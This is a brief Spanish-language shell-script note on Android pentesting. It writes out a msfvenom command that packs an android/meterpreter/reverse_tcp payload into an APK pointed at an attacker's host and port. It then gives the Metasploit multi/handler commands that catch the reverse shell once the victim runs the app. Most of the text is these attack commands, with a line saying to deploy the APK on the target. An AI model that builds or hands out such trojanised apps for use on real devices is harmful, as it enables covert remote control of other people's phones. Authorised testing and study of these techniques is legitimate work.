#!/bin/bash
#Android PenTesting

#En el mundo de la seguridad informatica y el pentesting, no existen muchas herramientas que nos permitan escanear o saber si ciertos dispositivos android tienen vulnerabilidades, es dificil en ese sentido poder encontrar fallos de seguridad que nos permitan explotar para ganar acceso y escalar permisos en estos dispositivos, por lo cual nos servimos de la investigacion o research.

#esta es la pagina ofical en donde podemos conocer las vulnerabilidades conocidas:
#https://source.android.com/security/bulletin/

#Exploit con aplicacion.

# Generamos un apk con el payload para poder explotar el dispositivo mediante una conexion tcp inversa
sudo msvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXXX R > name-of-app.apk

# Hacemos el deploy de la aplicacion apk en el target

#entramos a la consola de msf
sudo msfconsole -q # aqui el parametro -q inicia la consola de msf sin el banner caracteristico

# ya en la consola ejecutaremos los siguientes comandos

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST X.X.X.X
set LPORT XXXX

# Metasploit quedará a la escucha hasta que la aplicacion en el target se ejecute y al momento de hacerlo nos enviara al interprete de meterpreter.